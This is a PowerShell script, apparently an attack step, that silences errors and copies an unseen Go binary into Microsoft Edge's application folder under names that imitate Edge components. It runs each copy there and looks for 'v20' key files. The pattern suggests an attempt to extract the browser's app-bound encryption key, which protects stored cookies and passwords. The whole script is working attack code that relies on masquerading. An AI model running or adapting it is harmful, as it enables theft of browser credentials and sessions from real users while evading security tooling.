$e='SilentlyContinue';$ErrorActionPreference=$e
$p="$env:ProgramFiles(x86)" -replace '\(x86\)',' (x86)'
# actually build path properly
$ep=(Get-ChildItem 'C:\Program Files*\Microsoft\Edge\Application\msedge.exe' -EA SilentlyContinue | Select-Object -First 1).FullName
$ed=Split-Path $ep
Write-Output "edge dir: $ed"

# copy our Go binary into the Edge dir with an Edge-like name
$names=@('msedge_proxy.exe','msedge_helper.exe','msedge_crashpad.exe','msedge_elf.dll.tmp')
foreach($n in $names){
    $dst=Join-Path $ed $n
    Copy-Item C:\Windows\Temp\ziti\bd.exe $dst -Force
    Write-Output "copied to $dst"
}

# run each from the edge dir
foreach($n in $names){
    $dst=Join-Path $ed $n
    if(Test-Path $dst){
        Write-Output "running $n from edge dir..."
        try{
            $out = & $dst 2>&1 | Out-String
            Write-Output $out.Substring(0,[Math]::Min(500,$out.Length))
        }catch{ Write-Output "  err: $_" }
    }
}

# check if any produced a key file
Write-Output "checking for output files..."
Get-ChildItem C:\Windows\Temp\ziti\v20* -EA SilentlyContinue | Select-Object Name,Length | Format-Table | Out-String